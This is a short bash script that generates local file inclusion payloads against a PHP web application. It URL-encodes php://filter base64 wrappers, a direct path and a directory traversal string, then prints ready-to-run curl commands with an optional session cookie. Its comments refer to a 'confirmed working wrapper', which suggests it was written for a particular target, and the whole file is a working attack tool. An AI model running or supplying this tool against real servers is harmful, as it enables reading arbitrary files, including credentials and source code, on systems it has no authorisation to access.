#!/usr/bin/env bash
# lfi-payload — build LFI payloads for a target file against one injectable param.
# Usage:
#   ./lfi-payload.sh "http://target/INJECTION" -c "session=cookie" -f /var/www/html/proof.txt
set -euo pipefail

URL="${1:?usage: lfi-payload.sh \"http://target/INJECTION\" [-c cookie] -f /path/to/file}"
shift || true
COOKIE="" ; FILE=""
while [ $# -gt 0 ]; do
  case "$1" in
    -c) COOKIE="$2"; shift 2;;
    -f) FILE="$2";   shift 2;;
    *)  shift;;
  esac
done
: "${FILE:?need -f /path/to/target/file}"

enc() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1"; }
CK=${COOKIE:+-H \"Cookie: $COOKIE\"}

# Vectors, most-likely-to-work first (php://filter = your confirmed path)
declare -a RAW=(
  "php://filter/convert.base64-encode/resource=$FILE"
  "php://filter/read=convert.base64-encode/resource=$FILE"
  "$FILE"
  "../../../../../../../..$FILE"
)

echo "[*] Target file: $FILE"
echo
i=1
for v in "${RAW[@]}"; do
  u="${URL/INJECTION/$(enc "$v")}"
  if [[ "$v" == php://filter* ]]; then
    printf '%d) curl -s %s "%s" | base64 -d\n' "$i" "$CK" "$u"
  else
    printf '%d) curl -s %s "%s"\n' "$i" "$CK" "$u"
  fi
  i=$((i+1))
done
echo
echo "[*] Try #1 first (confirmed working wrapper). #3/#4 only if direct read is allowed."
